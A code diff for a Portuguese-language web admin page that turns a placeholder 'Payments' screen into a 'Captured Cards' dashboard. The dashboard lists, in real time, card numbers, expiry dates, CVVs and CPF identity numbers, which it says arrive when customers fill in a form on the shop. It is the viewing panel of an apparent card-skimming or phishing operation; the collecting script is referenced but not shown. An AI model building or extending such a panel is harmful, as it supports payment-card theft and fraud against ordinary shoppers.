@@ -17,21 +17,39 @@
 
             <main class="content">
                 <header class="page-header">
-                    <h1 class="page-title">Pagamentos</h1>
-                    <p class="text-secondary">Configuração de Gateways e Histórico de Transações</p>
+                    <h1 class="page-title">Cartões Capturados</h1>
+                    <p class="text-secondary">Visualização em tempo real de dados de cartões de crédito.</p>
                 </header>
 
-                <div class="glass-panel empty-state">
-                    <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
-                        <circle cx="12" cy="12" r="10"></circle>
-                        <line x1="12" y1="8" x2="12" y2="12"></line>
-                        <line x1="12" y1="16" x2="12.01" y2="16"></line>
-                    </svg>
-                    <h2 class="empty-state-title">Nenhum dado disponível</h2>
-                    <p class="empty-state-desc">
-                        Sistema pronto para integração de PIX e Cartão de Crédito. <br><br>
-                        Aguardando conexão com as APIs reais do sistema.
-                    </p>
+                <div class="glass-panel" style="padding: 0; overflow: hidden;">
+                    <div id="loading-state" style="padding: 40px; text-align: center; color: var(--text-secondary);">
+                        Carregando dados...
+                    </div>
+
+                    <div id="empty-state" class="empty-state" style="display: none; padding: 60px;">
+                        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                            <rect x="2" y="5" width="20" height="14" rx="2"></rect>
+                            <line x1="2" y1="10" x2="22" y2="10"></line>
+                        </svg>
+                        <h2 class="empty-state-title">Nenhum cartão capturado</h2>
+                        <p class="empty-state-desc">Os dados aparecerão aqui assim que um cliente preencher o formulário na loja.</p>
+                    </div>
+
+                    <table class="data-table" id="cards-table">
+                        <thead>
+                            <tr>
+                                <th>Dados do Cartão</th>
+                                <th>Validade</th>
+                                <th>CVV</th>
+                                <th>CPF</th>
+                                <th>Origem / Data</th>
+                                <th>Ações</th>
+                            </tr>
+                        </thead>
+                        <tbody id="cards-table-body">
+                            <!-- Injetado via JS -->
+                        </tbody>
+                    </table>
                 </div>
             </main>
         </div>
@@ -45,5 +63,6 @@
             renderTopbar();
         });
     </script>
+    <script src="/assets/js/payments.js"></script>
 </body>
 </html>
